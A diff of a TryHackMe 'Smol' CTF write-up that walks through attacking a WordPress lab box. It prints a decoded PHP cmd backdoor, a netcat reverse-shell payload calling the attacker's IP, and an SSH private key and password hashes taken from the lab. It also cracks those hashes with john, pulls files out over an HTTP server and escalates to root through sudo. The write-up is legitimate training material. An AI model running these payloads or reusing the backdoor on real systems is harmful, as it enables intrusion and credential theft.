@@ -1,5 +1,19 @@
 ![smol-logo](thm-writeup-smol.png)
 
+<br>
+<br>
+
+This TryHackMe medium-difficulty box was quite an experience! At first, we just explored the website since we had no clear idea of the vulnerability. Looking back at the hint, the creator mentioned LFI (Local File Inclusion) in a WordPress plugin and another backdoor plugin `holly dolly` to gain RCE (Remote Code Execution). Privilege escalation, on the other hand, had to be done manually.
+
+We followed the proper phases: scanning, enumeration, vulnerability identification, and gaining an initial foothold. This box stood out because it required a lot of deep exploration of the target machine using commands like find, grep, piping, and other Linux techniques. I also included data exfiltration techniques, which are quite effective in real-world engagements. One method is exfiltration via ICMP requests, which helps bypass traditional firewalls and intrusion detection systems by sending data in small chunks your can check out Atomic Red Team - T1048.003, which covers this technique in detail.
+
+Overall, it was a great challenge, and it really tested our ability to dig into the system. Thanks for reading, and happy hacking! 🚀
+
+<br>
+<br>
+
+![logo](logo.png)
+
 ## Debugging page content
 We were just messing around, exploring the page content with curl, and eventually, we stumbled upon the domain.
 
@@ -32,7 +46,7 @@ Lets add to our local host file
 ```
 
 ## Endpoint
-We were clicking around, looking for links that might be useful for further analysis, and after a short while, we found the `login.php` page.
+clicking around, looking for links that might be useful for further analysis, and after a short while, we found the `login.php` page.
 
 ![login.php](login.php.png)
 
@@ -81,10 +95,12 @@ MSG      0.000 feroxbuster::heuristics detected directory listing: http://www.sm
 200      GET      642l     2105w    17959c http://www.smol.thm/wp-includes/js/dist/plugins.js
 200      GET        2l      157w     4342c http://www.smol.thm/wp-includes/js/dist/plugins.min.js
 ```
+## Stack Identification
+![stack](stack.png)
 
 ## Vulnerability Identification 
 ```bash
-wpscan --url http://www.smol.thm/
+$ wpscan --url http://www.smol.thm/
 _______________________________________________________________
          __          _______   _____
          \ \        / /  __ \ / ____|
@@ -333,7 +349,7 @@ define( 'DB_COLLATE', '' );
 ![github](github.png)
 
 # www-data
-Looking at the hint in TryHackMe, there are two vulnerabilities for gaining initial access. The first is the LFI vulnerability, which allows reading credentials, and the second is an RCE found in the `Hello Dolly` plugin. This is quite interesting because it appears someone was already inside the system and planted a backdoor encoded in base64. So, every time the attacker visits the site, they already have access. This method is pretty common in web hacking scenarios, especially when administrators aren't performing regular penetration testing or code audits as part of their daily tasks.
+Looking back at the hint in TryHackMe, there are two vulnerabilities for gaining initial access. The first is the LFI vulnerability, which allows reading credentials, and the second is an RCE found in the `Hello Dolly` plugin. This is quite interesting because it appears someone was already inside the system and planted a backdoor encoded in base64. So, every time the attacker visits the site, they already have access. This method is pretty common in web hacking scenarios, especially when administrators aren't performing regular penetration testing or code audits as part of their daily tasks.
 
 <br>
 
@@ -428,10 +444,35 @@ add_action( 'admin_notices', 'hello_dolly' );
 
  if (isset($_GET["\143\155\x64"])) { system($_GET["\143\x6d\144"]); } %    
 ```
+#### Decoding the Obfuscated Code
+- The `\x` notation represents hexadecimal character encoding in PHP. Let's decode it:
+    - `\143` = c
+    - `\155` = m
+    - `\x64` = d
+```php
+if (isset($_GET["cmd"])) { 
+    system($_GET["cmd"]); 
+}
+
+```
+
 ![pwd](pwd.png)
 ![whoami](whoam.png)
 
-## Inital Access
+## Payload (Authenticated RCE)
+```bash
+# vulnerable endpoint
+http://www.smol.thm/wp-admin?cmd=busybox nc 10.23.42.147 9001 -e /bin/bash
+
+# reverse shell
+~/thm/smol > rlwrap -cAr nc -lvnp 9001                                                                                                                  01:47:00 PM
+listening on [any] 9001 ...
+connect to [10.23.42.147] from (UNKNOWN) [10.10.0.210] 47614
+python3 -c 'import pty;pty.spawn("/bin/bash)'
+$ export TERM=linux
+```
+
+## Initial Access
 ![www-data](initial-access.png)
 
 ```bash
@@ -616,4 +657,265 @@ def process_packet(pkt):
 # Start sniffing on the "tun0" interface with a filter for ICMP packets only
 sniff(iface="tun0", filter="icmp", prn=process_packet, store=0)  # store=0 prevents Scapy from storing packets in memory
 ```
-## To be continued....
+## Lateral movement
+> www-data to diego
+```bash 
+$ john --format=phpass --wordlist=/usr/share/wordlists/rockyou.txt users.hash                                                                04:29:36 PM
+
+Using default input encoding: UTF-8
+Loaded 6 password hashes with 6 different salts (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
+Cost 1 (iteration count) is 8192 for all loaded hashes
+Will run 6 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+sandiegocalifornia (?)     
+
+$ su - diego 
+password: sandiegocalifornia 
+```
+> from diego to think
+```bash
+diego@smol:/home/think/.ssh$ cat id_rsa
+cat id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAYEAxGtoQjY5NUymuD+3b0xzEYIhdBbsnicrrnvkMjOgdbp8xYKrfOgM
+ehrkrEXjcqmrFvZzp0hnVnbaCyUV8vDrywsrEivK7d5IDefssH/RqRinOY3FEYE+ekzKoH
++S6+jNEKedMH7DamLsXxsAG5b/Avm+FpWmvN1yS5sTeCeYU0wsHMP+cfM1cYcDkDU6HmiC
+A2G4D5+uPluSH13TS12JpFyU3EjHQvV6evERecriHSfV0PxMrrwJEyOwSPYA2c7RlYh+tb
+bniQRVAGE0Jato7kqAJOKZIuXHEIKhBnFOIt5J5sp6l/QfXxZYRMBaiuyNttOY1byNwj6/
+EEyQe1YM5chhtmJm/RWog8U6DZf8BgB2KoVN7k11VG74+cmFMbGP6xn1mQG6i2u3H6WcY1
+LAc0J1bhypGsPPcE06934s9jrKiN9Xk9BG7HCnDhY2A6bC6biE4UqfU3ikNQZMXwCvF8vY
+...
+...
+gKLOtX3EX2P11ZB9UX/nD9c30jEW7NrVcrC0qmts4HSpr1rggIm+JIom8xJQWuVK42Dmun
+lJqND0YfSgN5pqY4hNeqWIz2EnrFxfMaSzUFacK8WLQXVP2x8AAADBAPkcG1ZU4dRIwlXE
+XX060DsJ9omNYPHOXVlPmOov7Ull6TOdv1kaUuCszf2dhl1A/BBkGPQDP5hKrOdrh8vcRR
+A+Eog/y0lw6CDUDfwGQrqDKRxVVUcNbGNhjgnxRRg2ODEOK9G8GsJuRYihTZp0LniM2fHd
+jAoSAEuXfS7+8zGZ9k9VDL8jaNNM+BX+DZPJs2FxO5MHu7SO/yU9wKf/zsuu5KlkYGFgLV
+Ifa4X2anF1HTJJVfYWUBWAPPsKSfX1UQAAAMEAydo2UnBQhJUia3ux2LgTDe4FMldwZ+yy
+PiFf+EnK994HuAkW2l3R36PN+BoOua7g1g1GHveMfB/nHh4zEB7rhYLFuDyZ//8IzuTaTN
+7kGcF7yOYCd7oRmTQLUZeGz7WBr3ydmCPPLDJe7Tj94roX8tgwMO5WCuWHym6Os8z0NKKR
+u742mQ/UfeT6NnCJWHTorNpJO1fOexq1kmFKCMncIINnk8ZF1BBRQZtfjMvJ44sj9Oi4aE
+81DXo7MfGm0bSFAAAAEnRoaW5rQHVidW50dXNlcnZlcg==
+-----END OPENSSH PRIVATE KEY-----
+
+~/thm/smol > touch think_rsa && echo "<Private key>" > think_rsa 
+~/thm/smol > chmod 600 think_rsa 
+
+~/thm/smol > ssh -i think_rsa think@10.10.175.243                                                                                                         
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-156-generic x86_64)
+...
+...
+think@smol:~$ 
+```
+```bash
+~/thm/smol > scp -i think_rsa think@10.10.175.243:/opt/wp_backup.sql .
+
+wp_backup.sql                                   100%  285KB 101.9KB/s   00:02    
+
+~/thm/smol >                                                      
+```
+> lateral from think to gege
+```bash
+# cleanup file format
+~/thm/smol > sqlformat wp_backup.sql --reindent --keywords upper > wp_users_formatted.sql
+```
+
+```bash
+~/thm/smol > grep -A 20 "wp_users" wp_users_formatted.sql
+
+INSERT INTO `wp_users` 
+VALUES 
+    (1, 'admin', '$P$Bvi8BHb84pjY/Kw0RWsOXUXsQ1aACL1', 'admin', 'admin@smol.thm', 'http://192.168.204.139', '2023-08-16 06:58:30', '', 0, 'admin'),
+    (2, 'wpuser', '$P$BfZjtJpXL9gBwzNjLMTnTvBVh2Z1/E.', 'wp', 'wp@smol.thm', 'http://smol.thm', '2023-08-16 11:04:07', '', 0, 'wordpress user'),
+    (3, 'think', '$P$B0jO/cdGOCZhlAJfPSqV2gVi2pb7Vd/', 'think', 'josemlwdf@smol.thm', 'http://smol.thm', '2023-08-16 15:01:02', '', 0, 'Jose Mario Llado Marti'),
+    (4, 'gege', '$P$BsIY1w5krnhP3WvURMts0/M4FwiG0m1', 'gege', 'gege@smol.thm', 'http://smol.thm', '2023-08-17 20:18:50', '', 0, 'gege'),
+    (5, 'diego', '$P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1', 'diego', 'diego@smol.thm', 'http://smol.thm', '2023-08-17 20:19:15', '', 0, 'diego'),
+    (6, 'xavi', '$P$BvcalhsCfVILp2SgttADny40mqJZCN/', 'xavi', 'xavi@smol.thm', 'http://smol.thm', '2023-08-17 20:20:01', '', 0, 'xavi');
+
+/*!40000 ALTER TABLE `wp_users` ENABLE KEYS */;
+```
+> display only users on wp_users_formatted.sql
+```bash
+~/thm/smol > cat users.txt | awk -F"'," '{print $1}' | sed "s/'//g"  06:01:36 PM
+
+ALUES 
+    (1, admin
+    (2, wpuser
+    (3, think
+    (4, gege
+    (5, diego
+    (6, xavi
+
+~/thm/smol >  cat users.txt | awk -F"'," '{print $1}' | sed "s/'//g" > users1.txt 
+```
+> display only passwords hashes
+```bash
+~/thm/smol > cat users.txt | awk -F"'," '{print $2}' | sed "s/'//g"  06:12:39 PM
+
+ $P$Bvi8BHb84pjY/Kw0RWsOXUXsQ1aACL1
+ $P$BfZjtJpXL9gBwzNjLMTnTvBVh2Z1/E.
+ $P$B0jO/cdGOCZhlAJfPSqV2gVi2pb7Vd/
+ $P$BsIY1w5krnhP3WvURMts0/M4FwiG0m1
+ $P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1
+ $P$BvcalhsCfVILp2SgttADny40mqJZCN/
+
+~/thm/smol >                                                         
+```
+### cracking hashes
+```bash
+~/thm/smol > john --format=phpass --wordlist=/usr/share/wordlists/rockyou.txt users.hash
+Using default input encoding: UTF-8
+Loaded 6 password hashes with 6 different salts (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
+Remaining 5 password hashes with 5 different salts
+Cost 1 (iteration count) is 8192 for all loaded hashes
+Will run 6 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+hero_gege@hotmail.com (?)
+
+1g 0:00:16:02 DONE (2025-01-28 17:44) 0.001038g/s 14895p/s 67496c/s 67496C/s !!!@@@!!!..*7¡Vamos!
+Use the "--show --format=phpass" options to display all of the cracked passwords reliably
+Session completed. 
+```
+```bash
+~/thm/smol > john users.hash --show                                   
+?:hero_gege@hotmail.com
+?:sandiegocalifornia
+
+2 password hashes cracked, 4 left
+```
+Unfortunately, I initially thought I could crack these hashes since they were different from the previous ones, but it turned out to be a rabbit hole. I mean, the result pointing to Hotmail as the password seemed impossible seriously, hotmail? Haha. After digging deeper, I discovered that the user 'gege' is part of the same group as 'think,' which means we can switch from 'think' to 'gege' without needing to specify a password.
+
+```bash
+think@smol:~$ id 
+uid=1000(think) gid=1000(think) groups=1000(think),1004(dev),1005(internal)
+
+think@smol:~$ cat /etc/passwd | grep "sh$"
+root:x:0:0:root:/root:/usr/bin/bash
+think:x:1000:1000:,,,:/home/think:/bin/bash
+xavi:x:1001:1001::/home/xavi:/bin/bash
+diego:x:1002:1002::/home/diego:/bin/bash
+gege:x:1003:1003::/home/gege:/bin/bash
+
+think@smol:~$ cat /etc/group | grep -w "1004"
+dev:x:1004:think,gege
+
+think@smol:~$ su - gege
+gege@smol:~$ 
+``` 
+```bash
+gege@smol:~$ ls -al
+total 31532
+drwxr-x--- 2 gege internal     4096 Aug 18  2023 .
+drwxr-xr-x 6 root root         4096 Aug 16  2023 ..
+lrwxrwxrwx 1 root root            9 Aug 18  2023 .bash_history -> /dev/null
+-rw-r--r-- 1 gege gege          220 Feb 25  2020 .bash_logout
+-rw-r--r-- 1 gege gege         3771 Feb 25  2020 .bashrc
+-rw-r--r-- 1 gege gege          807 Feb 25  2020 .profile
+lrwxrwxrwx 1 root root            9 Aug 18  2023 .viminfo -> /dev/null
+-rwxr-x--- 1 root gege     32266546 Aug 16  2023 wordpress.old.zip
+
+gege@smol:~$ file *.zip
+wordpress.old.zip: Zip archive data, at least v1.0 to extract
+
+gege@smol:~$ 
+```
+> Exfiltrating data via python3 server 
+```bash
+gege@smol:~$ python3 -m http.server 8080
+Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
+10.23.42.147 - - [28/Jan/2025 09:41:54] "GET /wordpress.old.zip HTTP/1.1" 200 -
+
+# kali 
+~/thm/smol > curl http://10.10.175.243:8080/wordpress.old.zip -o worpress.old.zip
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100 30.7M  100 30.7M    0     0  1135k      0  0:00:27  0:00:27 --:--:-- 1643k
+```
+I tried cracking the zip file using the my own wordlist, but nothing happened. Then, I decided to try using a Hotmail address since it's from John result. The problem was, I wasn't sure if it was the actual password or not, or even which user the password belonged to. I thought I might be able to perform a password spray and see who owns the password, but again, nothing happened. Finally, I decided to use it on the zip file, and luckily, it worked.
+
+## Unlocking zipfile password protected 
+```bash
+
+~/thm/smol/wordpress > unzip *.zip                                                                                                                                                                                                Archive:  worpress.old.zip
+[worpress.old.zip] wordpress.old/wp-config.php password: hero_gege@hotmail.com
+
+~/thm/smol/wordpress > tree -L 2                                                                                                                                                                                                  
+.
+├── list_formats.txt
+├── wordpress.old
+│   ├── index.php
+│   ├── license.txt
+│   ├── readme.html
+│   ├── wp-activate.php
+│   ├── wp-admin
+│   ├── wp-blog-header.php
+│   ├── wp-comments-post.php
+│   ├── wp-config.php
+│   ├── wp-content
+│   ├── wp-cron.php
+│   ├── wp-includes
+│   ├── wp-links-opml.php
+│   ├── wp-load.php
+│   ├── wp-login.php
+│   ├── wp-mail.php
+│   ├── wp-settings.php
+│   ├── wp-signup.php
+│   ├── wp-trackback.php
+│   └── xmlrpc.php
+└── worpress.old.zip
+
+5 directories, 18 files
+```
+> lateral from 'gege' to 'xavi'
+```bash
+~/th/s/w/wordpress.old > find . -type f -name "*.php" -exec grep -H -E "DB_USER|DB_PASSWORD" {} \;    3s 06:43:01 PM
+
+./wp-config.php:define( 'DB_USER', 'xavi' );
+./wp-config.php:define( 'DB_PASSWORD', 'P@ssw0rdxavi@' );
+./wp-includes/load.php:	$dbuser     = defined( 'DB_USER' ) ? DB_USER : '';
+./wp-includes/load.php:	$dbpassword = defined( 'DB_PASSWORD' ) ? DB_PASSWORD : '';
+./wp-admin/setup-config.php:		define( 'DB_USER', $uname );
+./wp-admin/setup-config.php:		define( 'DB_PASSWORD', $pwd );
+./wp-admin/setup-config.php:				case 'DB_USER':
+./wp-admin/setup-config.php:				case 'DB_PASSWORD':
+
+~/thm/smol/wordpress/wordpress.old > 
+```
+```bash
+xavi@smol:~$ id
+uid=1001(xavi) gid=1001(xavi) groups=1001(xavi),1005(internal)
+
+xavi@smol:~$ whoami
+xavi
+```
+## Privilege Escalation
+**`(ALL : ALL) ALL`** means `xavi` can run any command as `any user` without restrictions. This effectively grants full root privileges to `xavi` when using `sudo /bin/bash`.
+```bash
+xavi@smol:/$ sudo -l 
+sudo -l 
+[sudo] password for xavi: P@ssw0rdxavi@
+
+Matching Defaults entries for xavi on smol:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User xavi may run the following commands on smol:
+    (ALL : ALL) ALL
+
+
+xavi@smol:/$ sudo /bin/bash
+sudo /bin/bash
+
+root@smol:/$ id
+id
+uid=0(root) gid=0(root) groups=0(root)
+
+root@smol:/$ cat /root/root.txt 
+```
+
+![completed](completed.png)
+
+## Flags
+- **user**:45edaec65{redacted}72b86963
+- **root**:bf89ea3ea{redacted}f1f576214d4e4
